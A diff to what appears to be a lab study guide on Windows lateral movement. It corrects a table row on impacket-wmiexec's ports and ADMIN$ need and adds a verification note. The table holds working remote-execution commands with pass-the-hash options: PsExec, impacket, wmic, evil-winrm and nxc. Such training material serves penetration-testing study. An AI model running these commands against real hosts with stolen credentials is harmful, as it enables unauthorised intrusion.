@@ -120,7 +120,7 @@ Lab-only; see [mimikatz-reference.md](../tools/mimikatz-reference.md).
 | SMB service control | Sysinternals `PsExec64.exe -accepteula \\SRV01 -u CORP\bob -p P@ss cmd.exe` | 445 | needs admin on target |
 | SMB (impacket) | `impacket-psexec 'corp.local/bob:P@ss@10.0.0.11'` | 445 | also `-hashes :NTLM` |
 | SMB (impacket) | `impacket-smbexec 'corp.local/bob@10.0.0.11' -hashes :NTLM` | 445 | no temp binary |
-| WMI (impacket) | `impacket-wmiexec 'corp.local/bob:P@ss@10.0.0.11'` | 135+ | no SMB admin share needed |
+| WMI (impacket) | `impacket-wmiexec 'corp.local/bob:P@ss@10.0.0.11'` | 135 + 445 | semi-interactive; writes output via `ADMIN$`, so it still needs admin |
 | WMI (legacy) | `wmic /node:SRV01 /user:CORP\bob /password:P@ss process call create "cmd.exe /c whoami > C:\o.txt"` | 135 | output is not returned; read the file |
 | WinRM | `evil-winrm -i 10.0.0.11 -u bob -p P@ss` / `-H HASH` | 5985/5986 | PowerShell remoting protocol |
 | WinRM | `Enter-PSSession -ComputerName SRV01 -Credential (Get-Credential)` | 5985/5986 | interactive |
@@ -160,6 +160,8 @@ nxc smb 10.0.0.11 -u bob -H '<NTLM>'          # valid hash? (Pwn3d! = admin)
 - [ ] I can execute commands on a remote host via PsExec, WinRM, and WMI
 - [ ] I can validate credentials/hashes with `nxc` before attempting access
 - [ ] I can identify the ports each remote-execution channel uses
+
+> **Verification:** the wmiexec output path was checked against upstream `examples/wmiexec.py` (output written to `\\127.0.0.1\<share>`, default share `ADMIN$`, read back over SMB) and the Impacket hash format against `examples/psexec.py` on 2026-09-19. Corrections applied from the 19 Sep 2026 audit.
 
 ## Further Resources
 
